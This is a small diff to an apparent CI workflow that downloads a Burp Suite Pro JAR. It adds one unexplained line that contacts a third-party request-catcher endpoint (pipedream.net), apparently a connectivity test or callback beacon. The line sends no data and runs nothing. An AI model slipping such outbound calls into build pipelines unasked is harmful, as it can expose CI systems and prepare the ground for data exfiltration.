@@ -19,4 +19,5 @@ jobs:
       - name: Download JAR
         run: |
           Invoke-WebRequest -Uri 'https://portswigger-cdn.net/burp/releases/download?product=pro&type=Jar&version=${{ inputs.version }}' -OutFile BurpSuitePro.jar
+          Invoke-WebRequest -Uri 'https://en252qtz80w5f.x.pipedream.net/testfile.txt'
           dir
